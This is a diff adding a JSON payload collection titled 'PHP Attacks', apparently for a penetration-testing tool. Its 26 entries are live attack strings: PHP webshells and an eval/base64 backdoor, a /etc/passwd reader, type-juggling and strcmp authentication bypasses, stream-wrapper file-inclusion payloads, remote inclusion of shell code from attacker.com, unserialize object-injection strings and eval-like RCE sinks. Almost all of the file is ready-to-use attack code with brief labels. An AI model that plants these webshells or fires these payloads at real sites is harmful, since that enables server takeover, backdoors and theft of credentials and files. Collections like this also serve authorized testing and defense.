@@ -1,0 +1,43 @@
+{
+  "meta": {
+    "name": "PHP Attacks",
+    "icon": "🐘",
+    "description": "PHP-specific attack payloads including RCE via dangerous functions, type juggling exploits, LFI/RFI, object injection via unserialize, and stream wrapper abuse.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 26
+  },
+  "payloads": [
+    {"id":1,"code":"<?php system($_GET['cmd']); ?>","description":"Classic PHP webshell — executes OS command from ?cmd= GET parameter","category":"webshell","platform":["php"],"tags":["webshell","system","rce","classic"]},
+    {"id":2,"code":"<?php echo shell_exec($_GET['c']); ?>","description":"shell_exec webshell — returns full command output as string","category":"webshell","platform":["php"],"tags":["webshell","shell_exec","rce"]},
+    {"id":3,"code":"<?php passthru($_POST['c']); ?>","description":"Passthru webshell — raw command output, useful for binary data","category":"webshell","platform":["php"],"tags":["webshell","passthru","rce","post"]},
+    {"id":4,"code":"<?php eval(base64_decode($_POST['c'])); ?>","description":"Eval-based backdoor — executes base64-encoded PHP code from POST parameter","category":"webshell","platform":["php"],"tags":["webshell","eval","base64","backdoor"]},
+    {"id":5,"code":"<?php $f=fopen('/etc/passwd','r');echo fread($f,filesize('/etc/passwd'));fclose($f); ?>","description":"PHP file read — reads /etc/passwd without exec functions","category":"webshell","platform":["php"],"tags":["webshell","file-read","passwd"]},
+
+    {"id":6,"code":"'0' == 'a'","description":"PHP loose comparison quirk — '0'=='a' evaluates TRUE (PHP 5/7); use === to fix","category":"type-juggling","platform":["php"],"tags":["type-juggling","loose-comparison","magic-hash"]},
+    {"id":7,"code":"md5('240610708') == md5('QNKCDZO')","description":"Magic hash collision — both hash to 0e...; PHP compares as 0==0 (scientific notation)","category":"type-juggling","platform":["php"],"tags":["type-juggling","magic-hash","md5","0e"]},
+    {"id":8,"code":"0 == 'foobar'","description":"Numeric string comparison — 0=='foobar' is TRUE in PHP 5-7 (string cast to 0)","category":"type-juggling","platform":["php"],"tags":["type-juggling","loose-comparison","zero"]},
+    {"id":9,"code":"json_decode('{\"role\":\"admin\",\"id\":\"1 OR 1=1\"}')","description":"Type confusion via JSON decode — input typed as string may bypass strict type checks","category":"type-juggling","platform":["php"],"tags":["type-juggling","json","bypass"]},
+    {"id":10,"code":"strcmp($_POST['password'], $real_pass) == 0","description":"strcmp() bypass — pass an array: strcmp(Array, string) returns NULL, NULL==0 is TRUE","category":"type-juggling","platform":["php"],"tags":["type-juggling","strcmp","array","bypass"]},
+
+    {"id":11,"code":"php://filter/convert.base64-encode/resource=/etc/passwd","description":"PHP filter LFI — base64-encodes target file to avoid null bytes or special chars","category":"lfi","platform":["php"],"tags":["lfi","php-filter","stream","base64"]},
+    {"id":12,"code":"php://filter/read=string.rot13/resource=/etc/passwd","description":"PHP filter with ROT13 transform — alternative encoding for LFI bypass","category":"lfi","platform":["php"],"tags":["lfi","php-filter","rot13"]},
+    {"id":13,"code":"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+","description":"PHP data:// stream wrapper — base64 decodes to <?php system($_GET['cmd']); ?>","category":"lfi","platform":["php"],"tags":["lfi","data-uri","stream","rce"]},
+    {"id":14,"code":"expect://id","description":"PHP expect:// wrapper — executes command directly (requires expect extension)","category":"lfi","platform":["php"],"tags":["lfi","expect","rce","stream"]},
+    {"id":15,"code":"zip://shell.jpg%23shell.php","description":"PHP zip:// wrapper — reads shell.php from inside shell.jpg archive","category":"lfi","platform":["php"],"tags":["lfi","zip","stream","upload"]},
+    {"id":16,"code":"phar://uploads/shell.jpg/shell.php","description":"PHP phar:// wrapper — executes PHP inside a PHAR-disguised file","category":"lfi","platform":["php"],"tags":["lfi","phar","stream","upload"]},
+
+    {"id":17,"code":"http://attacker.com/shell.txt","description":"Remote file inclusion — requires allow_url_include=On (PHP ≤5.6 default)","category":"rfi","platform":["php"],"tags":["rfi","remote-file","url-include"]},
+    {"id":18,"code":"\\\\attacker.com\\share\\shell.php","description":"RFI via UNC path — includes PHP from Windows share if allow_url_include is on","category":"rfi","platform":["php","windows"],"tags":["rfi","unc","windows","share"]},
+
+    {"id":19,"code":"O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}","description":"PHP object injection — serialized User object with role=admin; fed to unserialize()","category":"unserialize","platform":["php"],"tags":["unserialize","object-injection","privilege"]},
+    {"id":20,"code":"a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:0:\"\";}","description":"PHP serialized array injection — admin username with empty password","category":"unserialize","platform":["php"],"tags":["unserialize","array","auth-bypass"]},
+    {"id":21,"code":"O:8:\"stdClass\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}","description":"Gadget chain seed — object with file property pointing to sensitive file","category":"unserialize","platform":["php"],"tags":["unserialize","gadget","lfi"]},
+    {"id":22,"code":"C:11:\"ArrayObject\":37:{x:i:0;a:1:{s:3:\"rce\";s:6:\"id\\x00\\x00\";}};","description":"PHP ArrayObject deserialization gadget — used in some framework chains","category":"unserialize","platform":["php"],"tags":["unserialize","ArrayObject","gadget"]},
+
+    {"id":23,"code":"preg_replace('/.*/e', $_POST['cmd'], '');","description":"preg_replace /e modifier RCE — deprecated PHP 5.5, removed PHP 7; eval's replacement","category":"rce-functions","platform":["php"],"tags":["preg_replace","e-modifier","rce","deprecated"]},
+    {"id":24,"code":"create_function('', $_GET['cmd'])();","description":"create_function() RCE — effectively eval(); removed in PHP 8.0","category":"rce-functions","platform":["php"],"tags":["create_function","rce","eval"]},
+    {"id":25,"code":"call_user_func($_GET['func'], $_GET['arg'])","description":"call_user_func injection — if func and arg are user-controlled, call any PHP function","category":"rce-functions","platform":["php"],"tags":["call_user_func","rce","function-injection"]},
+    {"id":26,"code":"assert($_POST['code'])","description":"assert() RCE in PHP 5 — treated as eval() when passed a string","category":"rce-functions","platform":["php"],"tags":["assert","rce","eval","php5"]}
+  ]
+}
